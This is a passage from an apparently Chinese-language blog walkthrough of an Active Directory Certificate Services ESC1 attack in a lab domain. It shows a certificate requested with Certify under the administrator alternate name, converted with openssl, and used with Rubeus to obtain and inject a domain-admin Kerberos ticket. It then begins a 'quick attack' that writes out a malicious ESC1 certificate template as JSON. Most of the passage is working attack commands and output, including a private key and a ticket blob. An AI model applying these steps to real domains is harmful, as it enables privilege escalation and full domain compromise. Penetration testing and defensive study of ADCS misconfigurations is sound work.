+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>evil-winrm-py PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\t</span>estuser<span style="color:#ae81ff">\D</span>ocuments&gt; .<span style="color:#ae81ff">\C</span>ertify.exe request /ca:dc.wackadcs.com<span style="color:#ae81ff">\w</span>ackadcs-DC-CA /template:ESC /altname:administrator
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   _____          _   _  __              
+</span></span><span style="display:flex;"><span>  / ____|        | | <span style="color:#f92672">(</span>_<span style="color:#f92672">)</span>/ _|             
+</span></span><span style="display:flex;"><span> | |     ___ _ __| |_ _| |_ _   _        
+</span></span><span style="display:flex;"><span> | |    / _ <span style="color:#ae81ff">\ </span><span style="color:#960050;background-color:#1e0010">&#39;</span>__| __| |  _| | | |      
+</span></span><span style="display:flex;"><span> | |___|  __/ |  | |_| | | | |_| |       
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">\_</span>____<span style="color:#ae81ff">\_</span>__|_|   <span style="color:#ae81ff">\_</span>_|_|_|  <span style="color:#ae81ff">\_</span>_, |   
+</span></span><span style="display:flex;"><span>                             __/ |       
+</span></span><span style="display:flex;"><span>                            |___./        
+</span></span><span style="display:flex;"><span>  v1.1.0                               
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Action: Request a Certificates
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Current user context    : WACKADCS<span style="color:#ae81ff">\t</span>estuser
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> No subject name specified, using current context as subject.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Template                : ESC
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Subject                 : CN<span style="color:#f92672">=</span>testuser, CN<span style="color:#f92672">=</span>Users, DC<span style="color:#f92672">=</span>wackadcs, DC<span style="color:#f92672">=</span>com
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> AltName                 : administrator
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Certificate Authority   : dc.wackadcs.com<span style="color:#ae81ff">\w</span>ackadcs-DC-CA
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> CA Response             : The certificate had been issued.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Request ID              : <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> cert.pem         :
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-----BEGIN RSA PRIVATE KEY-----
+</span></span><span style="display:flex;"><span>MIIEpAIBAAKCAQEAx96DY8qk0ZekO+1NVRo+KT9iZf8BATvKqZ5xyfVm26uZAcPJ
+</span></span><span style="display:flex;"><span>D3nj6DMxH41b6RK1IpJpKct+dwD9R4Fca3uP2SAxiFxY5iMigd3I/1nHpZO3X/DS
+</span></span><span style="display:flex;"><span>0XPwVY0VeCDgFtDtqKMrQsTcQgzTcrwL5SWE+96E5Qk6lLhsbx/ZSlO2ncKRnx+F
+</span></span><span style="display:flex;"><span>heuN7gnA4qn1TWgZf0BTU1xKfxB5UqVS8fF7IEo/kkKSTm14w//8R27Ua6yarEbB
+</span></span><span style="display:flex;"><span>sjMF3oHj+FxnL7fkvVFTmto5hCaTUzdxcSOdF8dx0oKperulzItnasmKtCxUO2w4
+</span></span><span style="display:flex;"><span>WKBrNMMsRwAh0q/nWRQwOquJbc/0aGod7u7RlQIDAQABAoIBAErbulZL9cNSin6v
+</span></span><span style="display:flex;"><span>eIFhXNrSFKajBdtSa6tv3qqHsUihUqNokwuq2YOEeOeaaEw5Z4JVV/IBd5JW2oZH
+</span></span><span style="display:flex;"><span>mzfehZgLCMJL5Df9/NSrHrcVB0OqucnDRxKP2/oO53Wgyo2BHyJEStWtKdnLN/8H
+</span></span><span style="display:flex;"><span>E2V10gML6rZl6Hz/Pg243geKpyEarrhBHBP7W/u1iUs0ySpV4SxFOh4dFTWJmMWM
+</span></span><span style="display:flex;"><span>GfuVUU7BTU8OZwQUkyB9LbrT+q3p0DUgVx7zLlqbC1MzbjP61jQ5JAm3ep6Vq/Yb
+</span></span><span style="display:flex;"><span>NiPnQVbeHbMQjqjOqDm0zEV5QYQtVVA+aRd/5FzwmmI0VRz1lTWBUXwwdCYEHcWZ
+</span></span><span style="display:flex;"><span>jcSD8FkCgYEA9P7Q3Icrcbin4El/rAZVHqpHuALtzClSOjYBLmfUvd8Fq8TmEiZ/
+</span></span><span style="display:flex;"><span>2nbXXThV/U5qIxgkRSVHvCNGZelLPJN5r4dUJyy9kumxHYIJfER/LW+5A1KGC86k
+</span></span><span style="display:flex;"><span>tgkfIRmDzT9Nu8Z5npHa0L2LYR+c/rTFZKtSQAjVEjNkdavYwdmyvLsCgYEA0NjL
+</span></span><span style="display:flex;"><span>bxm/YWgoW/MQ1aqfTVOvI1IGdPZ+VPsXVHSX4VxbasTqobZ16wJLE+jtsEa+HeWa
+</span></span><span style="display:flex;"><span>fA6oXAGDD0Z1y6V4/GwVKI/zLhSgMbcoB/+NSnFu0HDHLbV2WtPpXXfIXk361/ns
+</span></span><span style="display:flex;"><span>5G5XWGBYvJYDzHoQHftjdVzECzzA2fnWTftPbe8CgYEAolS0z2pAvvk7QsFwdus7
+</span></span><span style="display:flex;"><span>OzZYjvRh3AUFFszxu23Q6H39o/Ky/xPDY12bFYlecJiketxkK+ynu2EkJCKQV3Lg
+</span></span><span style="display:flex;"><span>Dg39FHfwpIdzc7nVzyETo2eDj0/+wZQKTxN8LNJbIoPvXZwEuayq7+SnlZL800e0
+</span></span><span style="display:flex;"><span>AyABP6yagZTL26wh01ALvkECgYBJuj8XGZ/WY07cJxLqWzGhusk5Ttu4rswqc/no
+</span></span><span style="display:flex;"><span>dsCnblNXfezW6fL24/hdLv26HT9Ajq3a3dHRqTb7TYSIQAJWGlHd3/OZcO6cnmwj
+</span></span><span style="display:flex;"><span>ZrQac7ELJMUr/cOqjOT1ejPiFuVXGYPnoIx1Ro4NBWiR5wWJkBWsePM8hFYQnYJq
+</span></span><span style="display:flex;"><span>RS3lQQKBgQCZKFzAz4pWFRtrpNNUvOHRd6WBLAYNiGuGe/IKniQeUZRtkJaHQdXv
+</span></span><span style="display:flex;"><span>jwSBlXfmUGetfY8D5nlD6fybxUYf0Osgb7WAy/wQSYUWfGyw3k62B1+a8l8rpMSI
+</span></span><span style="display:flex;"><span>/2eWgG/BwJxu7z07mb4Z0Zp+V9a3R7yxc0PV1/VEwGucFFEXSsXhPA<span style="color:#f92672">==</span>
+</span></span><span style="display:flex;"><span>-----END RSA PRIVATE KEY-----
+</span></span><span style="display:flex;"><span>-----BEGIN CERTIFICATE-----
+</span></span><span style="display:flex;"><span>MIIFpzCCBI+gAwIBAgITRwAAAAiztITCzCjvHwAAAAAACDANBgkqhkiG9w0BAQsF
+</span></span><span style="display:flex;"><span>ADBIMRMwEQYKCZImiZPyLGQBGRYDY29tMRgwFgYKCZImiZPyLGQBGRYId2Fja2Fk
+</span></span><span style="display:flex;"><span>Y3MxFzAVBgNVBAMTDndhY2thZGNzLURDLUNBMB4XDTI1MDgyOTEwNTMxMFoXDTI2
+</span></span><span style="display:flex;"><span>MDgyOTEwNTMxMFowUjETMBEGCgmSJomT8ixkARkWA2NvbTEYMBYGCgmSJomT8ixk
+</span></span><span style="display:flex;"><span>ARkWCHdhY2thZGNzMQ4wDAYDVQQDEwVVc2VyczERMA8GA1UEAxMIdGVzdHVzZXIw
+</span></span><span style="display:flex;"><span>ggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDH3oNjyqTRl6Q77U1VGj4p
+</span></span><span style="display:flex;"><span>P2Jl/wEBO8qpnnHJ9Wbbq5kBw8kPeePoMzEfjVvpErUikmkpy353AP1HgVxre4/Z
+</span></span><span style="display:flex;"><span>IDGIXFjmIyKB3cj/Wcelk7df8NLRc/BVjRV4IOAW0O2ooytCxNxCDNNyvAvlJYT7
+</span></span><span style="display:flex;"><span>3oTlCTqUuGxvH9lKU7adwpGfH4WF643uCcDiqfVNaBl/QFNTXEp/EHlSpVLx8Xsg
+</span></span><span style="display:flex;"><span>Sj+SQpJObXjD//xHbtRrrJqsRsGyMwXegeP4XGcvt+S9UVOa2jmEJpNTN3FxI50X
+</span></span><span style="display:flex;"><span>x3HSgql6u6XMi2dqyYq0LFQ7bDhYoGs0wyxHACHSr+dZFDA6q4ltz/Roah3u7tGV
+</span></span><span style="display:flex;"><span>AgMBAAGjggJ+MIICejA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiDxo8/g+L0
+</span></span><span style="display:flex;"><span>AYGxix2Hm8gOhp6HRGud+qVSl9vWTAIBZAIBBDATBgNVHSUEDDAKBggrBgEFBQcD
+</span></span><span style="display:flex;"><span>AjAOBgNVHQ8BAf8EBAMCB4AwGwYJKwYBBAGCNxUKBA4wDDAKBggrBgEFBQcDAjAd
+</span></span><span style="display:flex;"><span>BgNVHQ4EFgQUemYdeXrgkaNdHVKuML4ES+6js+cwKAYDVR0RBCEwH6AdBgorBgEE
+</span></span><span style="display:flex;"><span>AYI3FAIDoA8MDWFkbWluaXN0cmF0b3IwHwYDVR0jBBgwFoAUHiNq67IPqjWhNvQo
+</span></span><span style="display:flex;"><span>ARl4Yl+qc6IwgcgGA1UdHwSBwDCBvTCBuqCBt6CBtIaBsWxkYXA6Ly8vQ049d2Fj
+</span></span><span style="display:flex;"><span>a2FkY3MtREMtQ0EsQ049ZGMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
+</span></span><span style="display:flex;"><span>Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9d2Fja2FkY3MsREM9
+</span></span><span style="display:flex;"><span>Y29tP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1j
+</span></span><span style="display:flex;"><span>UkxEaXN0cmlidXRpb25Qb2ludDCBwQYIKwYBBQUHAQEEgbQwgbEwga4GCCsGAQUF
+</span></span><span style="display:flex;"><span>BzAChoGhbGRhcDovLy9DTj13YWNrYWRjcy1EQy1DQSxDTj1BSUEsQ049UHVibGlj
+</span></span><span style="display:flex;"><span>JTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixE
+</span></span><span style="display:flex;"><span>Qz13YWNrYWRjcyxEQz1jb20/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNz
+</span></span><span style="display:flex;"><span>PWNlcnRpZmljYXRpb25BdXRob3JpdHkwDQYJKoZIhvcNAQELBQADggEBAAXl5dhO
+</span></span><span style="display:flex;"><span>r0TQawv3i8jtRKNYDbbuMhyldqnMmyk7FEm8xGcT54pKMSNejMg0VtuNT/KvZBqP
+</span></span><span style="display:flex;"><span>oonOEPh2ZHoh03MVtklBRoR9YtaxbZPC7JEydM+pAy+OOS64m+E0+S7Ox5Xt8ZA2
+</span></span><span style="display:flex;"><span>HqXIWCaVuvlPty33lH1YiQhW81e3SaeRXuBDA56VFNijlFogvjrI1MNi7EOurQMb
+</span></span><span style="display:flex;"><span>Hxu0/zUr6TZOaboIwEavzvy2eNfv5f8bxFYRI9tmpt+4U6HLFlPoPQ/7S/m3boNS
+</span></span><span style="display:flex;"><span>Su1pp4C+PKflGlp/5jAyDvRLsm3CiAZRaO70vLUvmttoElHPU/XGUrI4F/u0iV1R
+</span></span><span style="display:flex;"><span>UeXZ3nCktWcfXoo<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>-----END CERTIFICATE-----
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Convert with: openssl pkcs12 -in cert.pem -keyex -CSP <span style="color:#e6db74">&#34;Microsoft Enhanced Cryptographic Provider v1.0&#34;</span> -export -out cert.pfx
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Certify completed in 00:00:03.8674143
+</span></span></code></pre></div><p>复制完整的证书转换格式，并录入证书密钥</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/synthetic/adcs-test<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ openssl pkcs12 -in cert.pem -keyex -CSP <span style="color:#e6db74">&#34;Microsoft Enhanced Cryptographic Provider v1.0&#34;</span> -export -out cert.pfx
+</span></span><span style="display:flex;"><span>Enter Export Password:123456
+</span></span><span style="display:flex;"><span>Verifying - Enter Export Password:123456
+</span></span></code></pre></div><p>将生成的证书传回目标并用Rubeus利用pkinit请求tgt并注入当前会话</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>evil-winrm-py PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\t</span>estuser<span style="color:#ae81ff">\D</span>ocuments&gt; .<span style="color:#ae81ff">\R</span>ubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:123456 /ptt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   ______        _                      
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">(</span>_____ <span style="color:#ae81ff">\ </span>     | |                     
+</span></span><span style="display:flex;"><span>   _____<span style="color:#f92672">)</span> <span style="color:#f92672">)</span>_   _| |__  _____ _   _  ___ 
+</span></span><span style="display:flex;"><span>  |  __  /| | | |  _ <span style="color:#ae81ff">\|</span> ___ | | | |/___<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  | |  <span style="color:#ae81ff">\ \|</span> |_| | |_<span style="color:#f92672">)</span> <span style="color:#f92672">)</span> ____| |_| |___ |
+</span></span><span style="display:flex;"><span>  |_|   |_|____/|____/|_____<span style="color:#f92672">)</span>____/<span style="color:#f92672">(</span>___/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  v1.6.4 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Action: Ask TGT
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using PKINIT with etype rc4_hmac and subject: CN<span style="color:#f92672">=</span>testuser, CN<span style="color:#f92672">=</span>Users, DC<span style="color:#f92672">=</span>wackadcs, DC<span style="color:#f92672">=</span>com 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Building AS-REQ <span style="color:#f92672">(</span>w/ PKINIT preauth<span style="color:#f92672">)</span> <span style="color:#66d9ef">for</span>: <span style="color:#e6db74">&#39;wackadcs.com\administrator&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> TGT request successful!
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> base64<span style="color:#f92672">(</span>ticket.kirbi<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      doIFzDCCBcigAwIBBaEDAgEWooIE3DCCBNhhggTUMIIE0KADAgEFoQ4bDFdBQ0tBRENTLkNPTaIhMB+g
+</span></span><span style="display:flex;"><span>      AwIBAqEYMBYbBmtyYnRndBsMd2Fja2FkY3MuY29to4IElDCCBJCgAwIBEqEDAgECooIEggSCBH69O4aY
+</span></span><span style="display:flex;"><span>      cdHlYpgzQPr73+J9XmXoRmCqA/Wki5r+CMbIMLvueqnCpjch6rrZgoRF95qgQxsEVstY8HYMJrzTBOPN
+</span></span><span style="display:flex;"><span>      onZMbl6pgzqV8QeTN3p/awlUIO8ac0SsDPH2YTLl/mFHBoohSqTfCKQ1Gn5/q+CsPZOaf5CLPWJoBOiB
+</span></span><span style="display:flex;"><span>      C5bDapEI2GUN4dafAgGoj0GAF9TJr19j8IkwPlQy14hohErsMGIWot2N7iuYJLb4ERWYnClPsP4z9kxe
+</span></span><span style="display:flex;"><span>      wCD41vGdxMt0/7eMYd/TeDbh13Ilx0QNkSBWtHwCD3LRfaDKHbXO6oZb2kbNME7vHJxFkcAemWEzAp+0
+</span></span><span style="display:flex;"><span>      /PekCxQRGxmYFVIheE/VJJu/RTJB8l3tRw+fw1GpXOepKQsPQMwTT8YZBrthPLy4qjBIjQNNKC/67e1s
+</span></span><span style="display:flex;"><span>      Kni5m3rnsK06eS++Zj4AyFKmq+4Vy43cqOAUGdL5nreySvceJmbNBJkHe+Dm7ClKk32/n4SnhS0x9uV2
+</span></span><span style="display:flex;"><span>      JjSzy3uSA2xpCjHBxtZUGGsxU82W947QU528OjKDS+vjMuJN+5eszcaCs96pmK3vWZNAhIImt5gj+sbV
+</span></span><span style="display:flex;"><span>      LzhnnDiuOBSF2SQHfM+NPYuci4G0zUmUcy9pZv3to3pKpD7ZuYwntlkM5rBqZRT8P8gbnrgpnWwc5rg/
+</span></span><span style="display:flex;"><span>      eQDyeznTkdEvPhyllcU72wn6ylS9i/FDl+U9S8VNEE+IwGYDippaL/TTWAuythmLg7+9VF5HSwnRp1ba
+</span></span><span style="display:flex;"><span>      7NMxeC9EXKLBd3i2nZH5uZ1Bh9YdjAWW86XRiw2BYektqNlea5t2eEmEUnO0ToMm7ZpYNIsCuHQuT0mZ
+</span></span><span style="display:flex;"><span>      DIRLMiLskNHTVuthsoADqOBTa8fsliEerCUYPE7fmsQgft9c4nbLul/3GfT4QecAJgxTjL6bLhokKPAz
+</span></span><span style="display:flex;"><span>      1iPdcSQY0VdrBXm3IoMSy+oTqSu6Y7vwywbO8qNiN8Xh4ZeILTb3pTj5iU8SxyxEdyk6w4KcseD/J0Ik
+</span></span><span style="display:flex;"><span>      4fu2aUf5l+xpg6Acr6JlVndzFOmXtxMIsEPhs6DdlzKw0NdtHE82hX9TCmFLsS62zGcf0mfxrpOCSwq6
+</span></span><span style="display:flex;"><span>      Tg95Zwu9WVLAl2rfaF8ZDrInjbzEW73rsZmIw6cbJ0c0a/GxB+3LONEZ4MRPHwPIAClYVMzisx2++CK4
+</span></span><span style="display:flex;"><span>      WnNkHSYX/ixqSLGxz0U6ta/bPz1aT8uAfyRG43Zt5lStEX+BFfcPjmv0oxDVnoxPOQKI4tCxjwlSTbqR
+</span></span><span style="display:flex;"><span>      VTursusFJ5/6X54BV0tDOvYp4gqdEy4+Qx2/2JihaVgd6+9M0dHZBeWhCFj1xew29ysl+Q80R1CvJ78l
+</span></span><span style="display:flex;"><span>      qCFhAfCF6wA1BBpgLdJaEuszFtxAr8BKdzPN0ksoWTJIYLSGcfogvRAcLpj2E+dlvO61YxAx1qjQSC97
+</span></span><span style="display:flex;"><span>      zeK5khB4ApzVP890GNrdSzubkztEBZ811IjauCOw8uERNzlayNd2f5AnTn+EfIUDp4dek/ixTDGCTFV8
+</span></span><span style="display:flex;"><span>      H4HrgKE1NUfduGzRmiS62PUJbPTRhy/aXL12XQvV6IiMgXPJ3KvIdkphxvlqS4oCKXmBiRuNvS9lMlCQ
+</span></span><span style="display:flex;"><span>      /yYqGfGco4HbMIHYoAMCAQCigdAEgc19gcowgceggcQwgcEwgb6gGzAZoAMCARehEgQQVvE4TO9wnXeG
+</span></span><span style="display:flex;"><span>      nNT3b7pdi6EOGwxXQUNLQURDUy5DT02iGjAYoAMCAQGhETAPGw1hZG1pbmlzdHJhdG9yowcDBQBA4QAA
+</span></span><span style="display:flex;"><span>      pREYDzIwMjUwODI5MTEwODA1WqYRGA8yMDI1MDgyOTIxMDgwNVqnERgPMjAyNTA5MDUxMTA4MDVaqA4b
+</span></span><span style="display:flex;"><span>      DFdBQ0tBRENTLkNPTakhMB+gAwIBAqEYMBYbBmtyYnRndBsMd2Fja2FkY3MuY29t
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Ticket successfully imported!
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  ServiceName           :  krbtgt/wackadcs.com
+</span></span><span style="display:flex;"><span>  ServiceRealm          :  WACKADCS.COM
+</span></span><span style="display:flex;"><span>  UserName              :  administrator
+</span></span><span style="display:flex;"><span>  UserRealm             :  WACKADCS.COM
+</span></span><span style="display:flex;"><span>  StartTime             :  2025/8/29 19:08:05
+</span></span><span style="display:flex;"><span>  EndTime               :  2025/8/30 5:08:05
+</span></span><span style="display:flex;"><span>  RenewTill             :  2025/9/5 19:08:05
+</span></span><span style="display:flex;"><span>  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
+</span></span><span style="display:flex;"><span>  KeyType               :  rc4_hmac
+</span></span><span style="display:flex;"><span>  Base64<span style="color:#f92672">(</span>key<span style="color:#f92672">)</span>           :  VvE4TO9wnXeGnNT3b7pdiw<span style="color:#f92672">==</span>
+</span></span></code></pre></div><p>可以看到已经攻击成功了，我们通过pkiadmin在一个本没有可利用证书的环境中搞到了域管票据</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>evil-winrm-py PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\t</span>estuser<span style="color:#ae81ff">\D</span>ocuments&gt; klist
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>当前登录 ID 是 0:0xc60529
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>缓存的票证: <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#0&gt;	客户端: administrator @ WACKADCS.COM</span>
+</span></span><span style="display:flex;"><span>	服务器: krbtgt/wackadcs.com @ WACKADCS.COM
+</span></span><span style="display:flex;"><span>	Kerberos 票证加密类型: AES-256-CTS-HMAC-SHA1-96
+</span></span><span style="display:flex;"><span>	票证标志 0x40e10000 -&gt; forwardable renewable initial pre_authent name_canonicalize 
+</span></span><span style="display:flex;"><span>	开始时间: 8/29/2025 19:08:05 <span style="color:#f92672">(</span>本地<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>	结束时间:   8/30/2025 5:08:05 <span style="color:#f92672">(</span>本地<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>	续订时间: 9/5/2025 19:08:05 <span style="color:#f92672">(</span>本地<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>	会话密钥类型: RSADSI RC4-HMAC<span style="color:#f92672">(</span>NT<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>	缓存标志: 0x1 -&gt; PRIMARY 
+</span></span><span style="display:flex;"><span>	调用的 KDC: 
+</span></span></code></pre></div><h2 id="快速攻击">快速攻击
+</h2><p>在我完成以上的实操测试后我感觉实在是有些繁琐，我不相信实际域环境中不具备远程管理证书服务的工具</p>
+<p>最终我找到了这个<a class="link" href="https://github.com/GoateePFE/ADCSTemplate/blob/master/ADCSTemplate.psm1"  target="_blank" rel="noopener"
+    >ADCSTemplate</a>脚本，它不是为了注册恶意模板的，事实上它甚至不会被标记为恶意脚本，只是它恰好具备了我们需要的远程注册证书的功能</p>
+<p>为了利用它，我们需要将之前的esc1模板写成一个完整的json格式</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;name&#34;</span>:  <span style="color:#e6db74">&#34;ESC1&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;displayName&#34;</span>:  <span style="color:#e6db74">&#34;ESC1&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;objectClass&#34;</span>:  <span style="color:#e6db74">&#34;pKICertificateTemplate&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;flags&#34;</span>:  131616,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;revision&#34;</span>:  100,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;msPKI-Cert-Template-OID&#34;</span>:  <span style="color:#e6db74">&#34;1.3.6.1.4.1.311.21.8.16735922.7437492.10570883.2539024.15756463.185.9025784.11813639&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;msPKI-Certificate-Application-Policy&#34;</span>:  <span style="color:#f92672">[</span>
+</span></span><span style="display:flex;"><span>                                                 <span style="color:#e6db74">&#34;1.3.6.1.5.5.7.3.2&#34;</span>
+</span></span><span style="display:flex;"><span>                                             <span style="color:#f92672">]</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;msPKI-Certificate-Name-Flag&#34;</span>:  1,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;msPKI-Enrollment-Flag&#34;</span>:  0,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;msPKI-Minimal-Key-Size&#34;</span>:  2048,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;msPKI-Private-Key-Flag&#34;</span>:  16842752,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;msPKI-RA-Signature&#34;</span>:  0,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;msPKI-Template-Minor-Revision&#34;</span>:  4,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;msPKI-Template-Schema-Version&#34;</span>:  2,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;pKICriticalExtensions&#34;</span>:  <span style="color:#f92672">[</span>
+</span></span><span style="display:flex;"><span>                                  <span style="color:#e6db74">&#34;2.5.29.15&#34;</span>,
+</span></span><span style="display:flex;"><span>                                  <span style="color:#e6db74">&#34;2.5.29.7&#34;</span>
+</span></span><span style="display:flex;"><span>                              <span style="color:#f92672">]</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;pKIDefaultCSPs&#34;</span>:  <span style="color:#f92672">[</span>
+</span></span><span style="display:flex;"><span>                           <span style="color:#e6db74">&#34;3,Microsoft Base DSS Cryptographic Provider&#34;</span>,
+</span></span><span style="display:flex;"><span>                           <span style="color:#e6db74">&#34;2,Microsoft Base Cryptographic Provider v1.0&#34;</span>,
+</span></span><span style="display:flex;"><span>                           <span style="color:#e6db74">&#34;1,Microsoft Enhanced Cryptographic Provider v1.0&#34;</span>
+</span></span><span style="display:flex;"><span>                       <span style="color:#f92672">]</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;pKIDefaultKeySpec&#34;</span>:  2,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;pKIExpirationPeriod&#34;</span>:  <span style="color:#f92672">[</span>
+</span></span><span style="display:flex;"><span>                                0,
+</span></span><span style="display:flex;"><span>                                64,
+</span></span><span style="display:flex;"><span>                                57,
+</span></span><span style="display:flex;"><span>                                135,
+</span></span><span style="display:flex;"><span>                                46,
+</span></span><span style="display:flex;"><span>                                225,
+</span></span><span style="display:flex;"><span>                                254,
+</span></span><span style="display:flex;"><span>                                <span style="color:#ae81ff">255</span>
+</span></span><span style="display:flex;"><span>                            <span style="color:#f92672">]</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;pKIExtendedKeyUsage&#34;</span>:  <span style="color:#f92672">[</span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#e6db74">&#34;1.3.6.1.5.5.7.3.2&#34;</span>
+</span></span><span style="display:flex;"><span>                            <span style="color:#f92672">]</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;pKIKeyUsage&#34;</span>:  <span style="color:#f92672">[</span>
+</span></span><span style="display:flex;"><span>                        128,
+</span></span><span style="display:flex;"><span>                        <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">]</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;pKIMaxIssuingDepth&#34;</span>:  0,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;pKIOverlapPeriod&#34;</span>:  <span style="color:#f92672">[</span>
+</span></span><span style="display:flex;"><span>                             0,
+</span></span><span style="display:flex;"><span>                             128,
+</span></span><span style="display:flex;"><span>                             166,
+</span></span><span style="display:flex;"><span>                             10,
+</span></span><span style="display:flex;"><span>                             255,
